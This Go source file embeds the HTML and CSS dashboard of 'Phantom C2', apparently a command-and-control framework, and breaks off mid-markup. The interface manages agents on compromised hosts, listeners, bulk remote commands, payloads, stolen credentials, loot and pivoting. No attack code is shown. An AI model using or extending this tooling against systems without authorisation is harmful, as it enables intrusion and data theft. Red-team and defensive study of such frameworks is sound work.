package webui

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phantom C2</title>
<style>
:root, [data-theme="dark"] {
  /* ── Surfaces (Navy family) ── */
  --bg-primary:    #070b14;
  --bg-secondary:  #0d1120;
  --bg-card:       #111827;
  --bg-hover:      #161d30;
  --bg-input:      #0a0f1e;
  --border:        #1e2640;
  --border-light:  #28304f;

  /* ── Text ── */
  --text-primary:   #e8ecf4;
  --text-secondary: #7a86a8;
  --text-muted:     #44506e;

  /* ── Color 1: Violet (primary accent) ── */
  --violet:       #7c3aed;
  --violet-light: #a78bfa;
  --violet-dim:   rgba(124,58,237,0.12);
  --violet-glow:  rgba(124,58,237,0.25);

  /* ── Color 2: Cyan (data / online / highlights) ── */
  --cyan:         #06b6d4;
  --cyan-light:   #67e8f9;
  --cyan-dim:     rgba(6,182,212,0.12);
  --cyan-glow:    rgba(6,182,212,0.2);

  /* ── Color 3: Red (destructive only) ── */
  --red:          #ef4444;
  --red-dim:      rgba(239,68,68,0.12);

  /* ── Aliases for backwards compat ── */
  --accent:       var(--violet);
  --accent-light: var(--violet-light);
  --accent-glow:  var(--violet-dim);
  --green:        var(--cyan);
  --green-dim:    var(--cyan-dim);
  --yellow:       var(--violet-light);
  --yellow-dim:   var(--violet-dim);
  --blue:         var(--cyan);
  --blue-dim:     var(--cyan-dim);
  --purple:       var(--violet-light);

  --radius:    8px;
  --radius-lg: 12px;
  --shadow:    0 4px 32px rgba(0,0,0,0.5);
  --glass:     rgba(255,255,255,0.02);
  --glow-purple: 0 0 24px rgba(124,58,237,0.2);
  --glow-green:  0 0 24px rgba(6,182,212,0.15);
  --glow-blue:   0 0 24px rgba(6,182,212,0.15);
}
[data-theme="light"] {
  --bg-primary:    #f4f6fb;
  --bg-secondary:  #ffffff;
  --bg-card:       #ffffff;
  --bg-hover:      #edf0f7;
  --bg-input:      #f8f9fc;
  --border:        #dde1ee;
  --border-light:  #e8ecf4;
  --text-primary:  #111827;
  --text-secondary:#4b5563;
  --text-muted:    #9ca3af;

  --violet:        #7c3aed;
  --violet-light:  #6d28d9;
  --violet-dim:    rgba(124,58,237,0.08);
  --violet-glow:   rgba(124,58,237,0.15);

  --cyan:          #0891b2;
  --cyan-light:    #0e7490;
  --cyan-dim:      rgba(8,145,178,0.08);
  --cyan-glow:     rgba(8,145,178,0.12);

  --red:           #dc2626;
  --red-dim:       rgba(220,38,38,0.08);

  --accent:        var(--violet);
  --accent-light:  var(--violet-light);
  --accent-glow:   var(--violet-dim);
  --green:         var(--cyan);
  --green-dim:     var(--cyan-dim);
  --yellow:        var(--violet-light);
  --yellow-dim:    var(--violet-dim);
  --blue:          var(--cyan);
  --blue-dim:      var(--cyan-dim);
  --purple:        var(--violet-light);

  --shadow: 0 4px 24px rgba(0,0,0,0.08);
}

* { margin:0; padding:0; box-sizing:border-box; }
body { background: var(--bg-primary); color: var(--text-primary); font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif; font-size: 13px; line-height: 1.5; }
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg-primary); }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

/* ══════ TOPBAR ══════ */
.topbar {
  background: linear-gradient(135deg, var(--bg-secondary) 0%, rgba(124,58,237,0.05) 100%);
  border-bottom: 1px solid var(--border);
  padding: 0 20px;
  height: 52px;
  width: 100%;
  min-height: 52px;
  max-height: 52px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  flex-wrap: nowrap;
  flex-shrink: 0;
  position: fixed; top: 0; left: 0; right: 0; z-index: 200;
  overflow: hidden;
  backdrop-filter: blur(10px);
  box-shadow: 0 1px 20px rgba(0,0,0,0.3);
}
.topbar-left { display: flex; align-items: center; gap: 14px; flex-shrink: 0; }
.brand {
  display: flex; align-items: center; gap: 10px;
  font-size: 17px; font-weight: 700; color: var(--accent-light);
  letter-spacing: -0.3px;
}
.brand-icon {
  width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;
}
.brand-icon svg { width: 36px; height: 36px; filter: drop-shadow(0 0 6px rgba(124,58,237,0.5)); }
.brand small { font-size: 10px; color: var(--text-muted); font-weight: 400; margin-left: 4px; }
.topbar-center { display: flex; flex: 1; }
.topbar-right { display: flex; align-items: center; gap: 10px; flex-shrink: 0; white-space: nowrap; }
.pulse { width: 8px; height: 8px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); animation: pulse 2s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
.top-label { font-size: 11px; color: var(--text-muted); }

/* ══════ LAYOUT ══════ */
.app { display: flex; height: calc(100vh - 52px); margin-top: 52px; }
.sidebar {
  width: 82px; background: linear-gradient(180deg, var(--bg-secondary) 0%, rgba(10,14,26,0.95) 100%);
  border-right: 1px solid var(--border);
  display: flex; flex-direction: column; align-items: center; padding: 14px 0; gap: 2px;
  overflow-y: auto;
}
.sidebar-btn {
  width: 68px; padding: 8px 4px 6px; border-radius: 10px; border: none; cursor: pointer;
  background: transparent; color: var(--text-muted); font-size: 24px;
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  gap: 3px; transition: all 0.2s; position: relative;
}
.sidebar-btn .sb-label {
  font-size: 9px; font-weight: 600; letter-spacing: 0.3px; text-transform: uppercase;
}
.sidebar-btn:hover { background: var(--bg-hover); color: var(--text-primary); transform: scale(1.05); }
.sidebar-btn.active {
  background: var(--accent-glow); color: var(--accent-light);
  box-shadow: inset 3px 0 0 var(--accent), var(--glow-purple);
  border-radius: 0 10px 10px 0;
}
.sidebar-btn .badge-count {
  position: absolute; top: 2px; right: 6px; width: 18px; height: 18px;
  background: var(--red); color: white; border-radius: 50%; font-size: 9px;
  display: flex; align-items: center; justify-content: center; font-weight: 700;
}
.sidebar-divider { width: 48px; height: 1px; background: var(--border); margin: 6px 0; }
.content { flex: 1; overflow-y: auto; padding: 20px; }
.page { display: none; opacity: 0; } .page.active { display: block; animation: fadeIn 0.3s ease forwards; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }

/* ══════ STATS ══════ */
.stats-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 14px; margin-bottom: 20px; }
.stat-card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius-lg);
  padding: 20px 18px; position: relative; overflow: hidden;
  transition: all 0.25s ease; cursor: default;
}
.stat-card:hover { transform: translateY(-2px); }
.stat-card::before {
  content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px;
}
.stat-card::after {
  content: ''; position: absolute; bottom: -30px; right: -20px; width: 100px; height: 100px;
  border-radius: 50%; filter: blur(50px); opacity: 0.07;
}
.stat-card.purple::before { background: linear-gradient(90deg, var(--violet), var(--violet-light)); }
.stat-card.purple::after  { background: var(--violet); }
.stat-card.purple:hover   { border-color: var(--violet); box-shadow: 0 0 28px var(--violet-glow); }
.stat-card.green::before  { background: linear-gradient(90deg, var(--cyan), var(--cyan-light)); }
.stat-card.green::after   { background: var(--cyan); }
.stat-card.green:hover    { border-color: var(--cyan); box-shadow: 0 0 28px var(--cyan-glow); }
.stat-card.blue::before   { background: linear-gradient(90deg, var(--cyan), var(--violet-light)); }
.stat-card.blue::after    { background: var(--cyan); }
.stat-card.blue:hover     { border-color: var(--cyan); box-shadow: 0 0 28px var(--cyan-glow); }
.stat-card.yellow::before { background: linear-gradient(90deg, var(--violet-light), var(--cyan)); }
.stat-card.yellow::after  { background: var(--violet); }
.stat-card.yellow:hover   { border-color: var(--violet-light); box-shadow: 0 0 28px var(--violet-glow); }
.stat-label  { font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.4px; font-weight: 600; }
.stat-value  { font-size: 34px; font-weight: 800; margin-top: 8px; letter-spacing: -1.5px; line-height: 1; }
.stat-value.purple { color: var(--violet-light); }
.stat-value.green  { color: var(--cyan); }
.stat-value.blue   { color: var(--cyan-light); }
.stat-value.yellow { color: var(--violet-light); }
.stat-sub    { font-size: 11px; color: var(--text-muted); margin-top: 6px; }

/* ══════ CARDS / PANELS ══════ */
.card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: var(--radius-lg); margin-bottom: 16px; overflow: hidden;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.card:hover { border-color: var(--border-light); box-shadow: 0 8px 40px rgba(0,0,0,0.35); }
.card-header {
  padding: 13px 18px; border-bottom: 1px solid var(--border);
  display: flex; justify-content: space-between; align-items: center;
  background: rgba(0,0,0,0.15);
}
.card-header h3 { font-size: 13px; font-weight: 600; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
.card-header h3 span { font-size: 15px; }
.card-body { padding: 0; }
.card-body.padded { padding: 18px; }

/* ══════ TABLE ══════ */
table { width: 100%; border-collapse: collapse; table-layout: fixed; }
th {
  padding: 10px 16px; text-align: left; font-size: 10px; text-transform: uppercase;
  letter-spacing: 1.2px; color: var(--text-muted); font-weight: 600;
  background: rgba(0,0,0,0.25); border-bottom: 1px solid var(--border);
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
td { padding: 11px 16px; border-bottom: 1px solid rgba(42,48,80,0.3); font-size: 13px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
tr { transition: all 0.2s ease; }
tr:nth-child(even) td { background: rgba(0,0,0,0.08); }
tr:hover td { background: var(--accent-glow); border-color: rgba(124,58,237,0.1); }
tr.clickable { cursor: pointer; }

/* ══════ BADGES ══════ */
.badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600;
}
.b-active   { background: var(--cyan-dim);   color: var(--cyan); }
.b-running  { background: var(--cyan-dim);   color: var(--cyan); }
.b-complete { background: var(--cyan-dim);   color: var(--cyan-light); }
.b-dormant  { background: var(--violet-dim); color: var(--violet-light); }
.b-pending  { background: var(--violet-dim); color: var(--violet-light); }
.b-sent     { background: var(--violet-dim); color: var(--violet-light); }
.b-dead     { background: var(--red-dim);    color: var(--red); }
.b-stopped  { background: var(--red-dim);    color: var(--red); }
.b-error    { background: var(--red-dim);    color: var(--red); }
.b-idle     { background: var(--violet-dim); color: var(--violet-light); }
.badge-dot { width: 6px; height: 6px; border-radius: 50%; }
.b-active .badge-dot  { background: var(--cyan);   box-shadow: 0 0 6px var(--cyan);   animation: dotPulse 2s infinite; }
.b-dormant .badge-dot { background: var(--violet-light); animation: dotPulse 3s infinite; }
.b-dead .badge-dot    { background: var(--red); }
@keyframes dotPulse { 0%,100%{box-shadow: 0 0 4px currentColor} 50%{box-shadow: 0 0 14px currentColor} }

/* ══════ AGENT CARDS ══════ */
.agent-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 14px; padding: 18px; }
.agent-card {
  display: flex; align-items: center; gap: 12px;
  background: var(--bg-secondary);
  border: 1px solid var(--border); border-radius: var(--radius);
  padding: 8px 12px; cursor: pointer; transition: border-color .2s, background .2s;
  position: relative; overflow: hidden;
}
.agent-card::before {
  content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
  background: var(--accent); opacity: 0; transition: opacity 0.2s;
}
.agent-card:hover { border-color: var(--accent); background: rgba(124,58,237,0.06); }
.agent-card:hover::before { opacity: 1; }
.agent-top { display: flex; justify-content: space-between; align-items: start; margin-bottom: 12px; }
.agent-name { font-size: 15px; font-weight: 700; color: var(--accent-light); }
.agent-os { display: flex; align-items: center; gap: 5px; font-size: 12px; color: var(--text-secondary); margin-top: 3px; }
.agent-details { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
.agent-detail { }
.agent-detail-label { font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; }
.agent-detail-value { font-size: 13px; color: var(--text-primary); margin-top: 1px; }

/* ══════ TERMINAL ══════ */
.terminal {
  background: linear-gradient(180deg, #0c0f1a 0%, #080a14 100%);
  border: 1px solid var(--border); border-radius: var(--radius-lg);
  overflow: hidden; box-shadow: 0 8px 40px rgba(0,0,0,0.5);
}
.term-bar {
  background: #151929; padding: 10px 16px; display: flex; align-items: center;
  gap: 8px; border-bottom: 1px solid var(--border);
}
.term-dot { width: 11px; height: 11px; border-radius: 50%; }
.term-dot.r { background: #ff5f57; } .term-dot.y { background: #febc2e; } .term-dot.g { background: #28c840; }
.term-title { color: var(--text-muted); font-size: 12px; margin-left: 10px; font-weight: 500; }
.term-body {
  padding: 16px; min-height: 300px; max-height: 450px; overflow-y: auto;
  font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
  font-size: 13px; line-height: 1.7;
}
.term-line { color: var(--green); }
.term-error { color: var(--red); }
.term-info { color: var(--blue); }
.term-output { color: var(--text-primary); white-space: pre-wrap; word-break: break-all; }
.term-input-row {
  display: flex; align-items: center; padding: 10px 16px;
  background: #0a0d18; border-top: 1px solid var(--border);
}
.term-prompt {
  color: var(--accent-light); font-family: monospace; font-size: 13px;
  margin-right: 8px; white-space: nowrap; font-weight: 600;
}
.term-input {
  flex: 1; background: none; border: none; color: var(--text-primary);
  font-family: monospace; font-size: 13px; outline: none; caret-color: var(--accent-light);
}

/* ══════ QUICK ACTIONS ══════ */
.quick-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 14px; }
.qbtn {
  padding: 6px 12px; border-radius: 6px; border: 1px solid var(--border);
  background: var(--bg-card); color: var(--text-secondary); cursor: pointer;
  font-size: 11px; font-weight: 500; transition: all 0.2s ease;
  font-family: monospace;
}
.qbtn:hover { border-color: var(--accent); color: var(--accent-light); background: var(--accent-glow); transform: translateY(-1px); box-shadow: 0 2px 8px rgba(124,58,237,0.2); }
.qbtn:active { transform: translateY(0); }
.qbtn.danger { border-color: rgba(239,68,68,0.3); }
.qbtn.danger:hover { border-color: var(--red); color: var(--red); background: var(--red-dim); }

/* ══════ PAYLOAD GENERATOR ══════ */
.pl-cat-btn {
  padding: 7px 14px; border-radius: 6px; border: 1px solid var(--border);
  background: var(--bg-input); color: var(--text-muted); cursor: pointer;
  font-size: 12px; font-weight: 500; transition: all 0.15s; white-space: nowrap;
}
.pl-cat-btn:hover { border-color: var(--violet); color: var(--violet-light); background: var(--violet-dim); }
.pl-cat-active { border-color: var(--violet) !important; color: var(--violet-light) !important; background: var(--violet-dim) !important; font-weight: 700 !important; }
.pl-type-card {
  display: flex; flex-direction: column; gap: 5px; padding: 12px 10px;
  border: 1px solid var(--border); border-radius: 8px; cursor: pointer;
  background: var(--bg-secondary); transition: all 0.15s; text-align: center;
}
.pl-type-card:hover { border-color: var(--violet); background: var(--violet-dim); transform: translateY(-1px); box-shadow: 0 4px 16px rgba(124,58,237,0.15); }
.pl-type-card.selected { border-color: var(--violet) !important; border-width: 2px; background: var(--violet-dim) !important; box-shadow: 0 0 0 3px rgba(124,58,237,0.1); }
.pl-type-card .pt-icon { font-size: 22px; }
.pl-type-card .pt-name { font-size: 11px; font-weight: 700; color: var(--text-primary); }
.pl-type-card .pt-desc { font-size: 9px; color: var(--text-muted); line-height: 1.3; }
.pl-type-card .pt-badge { font-size: 9px; font-weight: 700; padding: 1px 6px; border-radius: 8px; display: inline-block; margin-top: 2px; }

/* ══════ SELECT ══════ */
.select-wrap { position: relative; }
.select-wrap select {
  appearance: none; background: var(--bg-input); border: 1px solid var(--border);
  color: var(--text-primary); padding: 8px 32px 8px 12px; border-radius: var(--radius);
  font-size: 12px; cursor: pointer; outline: none; min-width: 200px;
}
.select-wrap::after {
  content: '▾'; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
  color: var(--text-muted); pointer-events: none; font-size: 12px;
}

/* ══════ EVENT LOG ══════ */
.event-log {
  font-family: monospace; font-size: 12px; padding: 16px; max-height: 500px;
  overflow-y: auto; line-height: 1.8;
}
.event-item { color: var(--text-muted); padding: 2px 0; }
.event-item:hover { color: var(--text-secondary); }

/* ══════ EMPTY STATE ══════ */
.empty { text-align: center; padding: 48px 20px; color: var(--text-muted); }
.empty-icon { font-size: 40px; margin-bottom: 12px; opacity: 0.5; }
.empty-text { font-size: 14px; }
.empty-sub { font-size: 12px; margin-top: 6px; }

/* ══════ RESPONSIVE ══════ */
@media (max-width: 900px) {
  .stats-grid { grid-template-columns: repeat(2,1fr); }
  .agent-grid { grid-template-columns: 1fr; }
  .sidebar { display: none; }
}
</style>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <div class="topbar-left">
    <div class="brand">
      <div class="brand-icon"><svg viewBox="0 0 100 50" xmlns="http://www.w3.org/2000/svg">
        <defs><linearGradient id="b2grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#a78bfa"/><stop offset="100%" style="stop-color:#6d28d9"/></linearGradient></defs>
        <!-- B-2 Spirit Stealth Bomber silhouette -->
        <path d="M50 8 L15 30 L2 28 L8 32 L15 35 L28 38 L42 42 L50 44 L58 42 L72 38 L85 35 L92 32 L98 28 L85 30 Z" fill="url(#b2grad)" stroke="none"/>
        <path d="M50 12 L35 28 L50 36 L65 28 Z" fill="rgba(10,14,26,0.4)" stroke="none"/>
        <circle cx="50" cy="26" r="2" fill="#a78bfa" opacity="0.8"/>
      </svg></div>
      Phantom <small>C2</small>
    </div>
  </div>
  <div class="topbar-center"></div>
  <div class="topbar-right">
    <span class="top-label" id="engagement-timer" title="Engagement duration">⏱ 00:00:00</span>
    <button onclick="toggleNotifications()" style="background:none;border:none;cursor:pointer;font-size:16px;position:relative" id="notif-btn" title="Toggle browser notifications">🔔</button>
    <button onclick="generateReport()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Generate report">📄 Report</button>
    <button onclick="exportData()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Export JSON">📥 Export</button>
    <button onclick="configureWebhook()" style="background:none;border:none;cursor:pointer;font-size:14px;color:var(--text-muted)" title="Configure webhook">🔗</button>
    <div class="pulse"></div>
    <span class="top-label">Online</span>
    <a href="/logout" style="background:none;border:none;cursor:pointer;font-size:13px;color:var(--red);text-decoration:none;margin-left:8px" title="Logout">⏻ Logout</a>
  </div>
</div>

<div class="app">
  <!-- SIDEBAR ICONS -->
  <div class="sidebar">
    <button class="sidebar-btn active" onclick="nav('dashboard')" title="Dashboard">📊<span class="sb-label">Dashboard</span></button>
    <button class="sidebar-btn" onclick="nav('agents')" title="Agents">
      🖥️<span class="sb-label">Agents</span><span class="badge-count" id="sb-agents" style="display:none">0</span>
    </button>
    <button class="sidebar-btn" onclick="nav('listeners')" title="Listeners">📡<span class="sb-label">Listeners</span></button>
    <button class="sidebar-btn" onclick="nav('tasks')" title="Tasks">📋<span class="sb-label">Tasks</span></button>
    <div class="sidebar-divider"></div>
    <button class="sidebar-btn" onclick="nav('terminal')" title="Terminal">💻<span class="sb-label">Terminal</span></button>
    <button class="sidebar-btn" onclick="nav('payloads')" title="Payloads">🔧<span class="sb-label">Payloads</span></button>
    <button class="sidebar-btn" onclick="nav('files')" title="Files">📂<span class="sb-label">Files</span></button>
    <button class="sidebar-btn" onclick="nav('creds')" title="Credentials">🔑<span class="sb-label">Creds</span></button>
    <button class="sidebar-btn" onclick="nav('loot')" title="Loot">🎯<span class="sb-label">Loot</span></button>
    <button class="sidebar-btn" onclick="nav('pivotgraph')" title="Pivot Map">🗺️<span class="sb-label">Pivot Map</span></button>
    <button class="sidebar-btn" onclick="nav('ioc')" title="IOC Tracker">🚨<span class="sb-label">IOC</span></button>
    <div class="sidebar-divider"></div>
    <button class="sidebar-btn" onclick="nav('templates')" title="Command Templates">📑<span class="sb-label">Templates</span></button>
    <button class="sidebar-btn" onclick="nav('audit')" title="Audit Log">📝<span class="sb-label">Audit</span></button>
    <button class="sidebar-btn" onclick="nav('events')" title="Events">📜<span class="sb-label">Events</span></button>
    <button class="sidebar-btn" onclick="nav('settings')" title="Settings">⚙️<span class="sb-label">Settings</span></button>
    <div style="flex:1"></div>
    <button class="sidebar-btn" onclick="toggleTheme()" title="Toggle Theme" id="theme-btn">🌙<span class="sb-label">Theme</span></button>
  </div>

  <div class="content">

    <!-- ══════ DASHBOARD ══════ -->
    <div id="p-dashboard" class="page active">
      <div class="stats-grid">
        <div class="stat-card green"><div class="stat-label">Active Agents</div><div class="stat-value green" id="s-agents">0</div><div class="stat-sub" id="s-agents-sub">No agents connected</div></div>
        <div class="stat-card purple"><div class="stat-label">Listeners</div><div class="stat-value purple" id="s-listeners">0</div><div class="stat-sub" id="s-listeners-sub">—</div></div>
        <div class="stat-card blue"><div class="stat-label">Tasks Completed</div><div class="stat-value blue" id="s-tasks">0</div><div class="stat-sub" id="s-tasks-sub">—</div></div>
        <div class="stat-card yellow"><div class="stat-label">Events</div><div class="stat-value yellow" id="s-events">0</div><div class="stat-sub" id="s-events-sub">—</div></div>
      </div>

      <!-- Beacon Graphs Row -->
      <div style="display:grid; grid-template-columns:2fr 1fr 1fr; gap:14px; margin-bottom:16px;">
        <!-- Beacon Timeline Graph -->
        <div class="card">
          <div class="card-header"><h3><span>📈</span> Beacon Activity</h3><span style="font-size:11px;color:var(--text-muted)">Last 60 minutes</span></div>
          <div class="card-body" style="padding:16px;">
            <canvas id="beacon-chart" height="140"></canvas>
          </div>
        </div>
        <!-- OS Distribution -->
        <div class="card">
          <div class="card-header"><h3><span>🎯</span> Targets by OS</h3></div>
          <div class="card-body" style="padding:20px;">
            <canvas id="os-chart" height="150"></canvas>
          </div>
        </div>
        <!-- Session Status -->
        <div class="card">
          <div class="card-header"><h3><span>⚡</span> Session Health</h3></div>
          <div class="card-body" style="padding:20px;" id="session-health">
            <div class="empty" style="padding:20px"><div class="empty-icon" style="font-size:28px">📊</div><div class="empty-sub">No sessions yet</div></div>
          </div>
        </div>
      </div>

      <!-- Network Topology (Cobalt Strike graph view) -->
      <div class="card">
        <div class="card-header"><h3><span>🌐</span> Network Graph</h3><span style="font-size:11px;color:var(--text-muted)">Beacon topology</span></div>
        <div class="card-body" style="padding:0; background:#080c16;">
          <canvas id="network-graph" height="320" style="width:100%;cursor:default;"></canvas>
        </div>
      </div>

      <div style="height:14px"></div>

      <div class="card">
        <div class="card-header"><h3><span>🖥️</span> Connected Agents</h3></div>
        <div class="card-body" id="dash-agents-wrap">
          <div class="empty"><div class="empty-icon">📡</div><div class="empty-text">Waiting for agents...</div><div class="empty-sub">Deploy an agent to get started</div></div>
        </div>
      </div>

      <div class="card">
        <div class="card-header"><h3><span>📋</span> Recent Activity</h3></div>
        <div class="card-body"><table><thead><tr><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th></tr></thead><tbody id="dash-tasks"></tbody></table></div>
      </div>
    </div>

    <!-- ══════ AGENTS ══════ -->
    <div id="p-agents" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🖥️</span> All Agents</h3>
          <div style="display:flex;gap:6px">
            <button class="qbtn" onclick="bulkSelectAll()" style="font-size:11px">Select All</button>
            <input id="bulk-cmd" placeholder="Command for selected agents..." style="padding:5px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;width:250px">
            <button class="qbtn" onclick="bulkSendCmd()" style="font-size:11px;background:var(--accent-glow);color:var(--accent-light)">Run on Selected</button>
            <button class="qbtn" onclick="bulkRemoveDead()" style="font-size:11px;color:var(--red)">Remove Dead</button>
          </div>
        </div>
        <div class="card-body"><table>
          <thead><tr><th style="width:30px"><input type="checkbox" id="bulk-all" onchange="bulkToggleAll(this)"></th><th>Name</th><th>OS</th><th>Hostname</th><th>User</th><th>IP</th><th>Sleep</th><th>Last Seen</th><th>Status</th><th></th></tr></thead>
          <tbody id="all-agents"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ LISTENERS ══════ -->
    <div id="p-listeners" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px;">

        <!-- Active Listeners -->
        <div class="card">
          <div class="card-header"><h3><span>📡</span> Active Listeners</h3></div>
          <div class="card-body"><table>
            <thead><tr><th>Name</th><th>Type</th><th>Bind Address</th><th>Status</th><th>Actions</th></tr></thead>
            <tbody id="all-listeners"></tbody>
          </table></div>
        </div>

        <!-- Saved Presets -->
        <div class="card">
          <div class="card-header"><h3><span>💾</span> Saved Presets</h3></div>
          <div class="card-body">
            <div id="presets-list" style="margin-bottom:12px;"></div>
          </div>
        </div>
      </div>

      <!-- Create / Save New Listener -->
      <div class="card">
        <div class="card-header"><h3><span>➕</span> Create Listener</h3></div>
        <div class="card-body padded">
          <div style="display:grid;grid-template-columns:1fr 1fr 2fr 1fr;gap:10px;align-items:end;">
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Name</label>
              <input type="text" id="ln-name" placeholder="my-listener" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
            </div>
            <div>
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Type</label>
              <select id="ln-type" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onchange="onListenerTypeChange()">
                <option value="http">HTTP</option>
                <option value="https">HTTPS</option>
                <option value="ws">WebSocket (ws://)</option>
                <option value="wss">WebSocket TLS (wss://)</option>
                <option value="tcp">TCP (Raw)</option>
                <option value="dns">DNS</option>
                <option value="smb">SMB (Named Pipe)</option>
              </select>
            </div>
            <div id="ln-bind-wrap">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Bind Address</label>
              <input type="text" id="ln-bind" placeholder="0.0.0.0:8080" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
            </div>
            <div id="ln-profile-wrap">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Profile</label>
              <select id="ln-profile" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                <option value="default">Default</option>
                <option value="microsoft">Microsoft 365</option>
                <option value="cloudflare">Cloudflare</option>
              </select>
            </div>
          </div>
          <!-- SMB note (hidden unless SMB selected) -->
          <div id="ln-smb-note" style="display:none;margin-top:10px;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-muted)">
            <span style="color:var(--cyan);font-weight:600">🔗 SMB Named Pipe is agent-side</span> — the pipe relay runs on a compromised host, not the C2 server.<br>
            To start a relay: go to <strong>Terminal</strong>, select an agent, and use the <strong>SMB Pivot</strong> card (or type <code style="color:var(--cyan)">pivot start</code>).
          </div>
          <div style="display:flex;gap:8px;margin-top:12px;">
            <button class="btn" onclick="createListener(false)" style="padding:8px 18px;font-size:13px;">🚀 Create & Start</button>
            <button class="btn" onclick="createListener(true)" style="padding:8px 18px;font-size:13px;background:var(--green);">💾 Create, Start & Save Preset</button>
            <button class="qbtn" onclick="savePresetOnly()" style="padding:8px 14px;font-size:12px;">💾 Save as Preset Only</button>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ TASKS ══════ -->
    <div id="p-tasks" class="page">
      <div class="card">
        <div class="card-header"><h3><span>📋</span> Task History</h3></div>
        <div class="card-body"><table>
          <thead><tr><th>ID</th><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th><th style="max-width:300px">Output</th></tr></thead>
          <tbody id="all-tasks"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ TERMINAL ══════ -->
    <div id="p-terminal" class="page">
      <!-- Agent session tabs -->
      <div id="agent-tabs" style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap;border-bottom:1px solid var(--border);padding-bottom:8px">
        <span style="color:var(--text-muted);font-size:11px;padding:6px 0;margin-right:6px">SESSIONS:</span>
      </div>

      <div style="display:flex; gap:12px; align-items:center; margin-bottom:14px;">
        <span style="color:var(--text-muted); font-size:12px; font-weight:600; text-transform:uppercase; letter-spacing:1px;">Target</span>
        <div class="select-wrap">
          <select id="agent-select">
            <option value="">Select an agent...</option>
          </select>
        </div>
        <span id="agent-badge-area"></span>
        <div style="margin-left:auto;display:flex;gap:8px;align-items:center">
          <input type="number" id="agent-sleep" placeholder="Sleep" style="width:60px;padding:5px 8px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px" title="Sleep seconds">
          <input type="number" id="agent-jitter" placeholder="Jitter" style="width:60px;padding:5px 8px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px" title="Jitter %">
          <button class="qbtn" onclick="updateSleep()" style="font-size:11px;padding:5px 10px" title="Update agent sleep/jitter">Set Sleep</button>
          <button class="qbtn" onclick="setKillDate()" style="font-size:11px;padding:5px 10px;color:var(--red)" title="Set agent kill date">Kill Date</button>
        </div>
      </div>

      <div class="terminal">
        <div class="term-bar">
          <div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div>
          <span class="term-title" id="term-title">Phantom C2 — Select an agent to begin</span>
        </div>
        <div class="term-body" id="term-body">
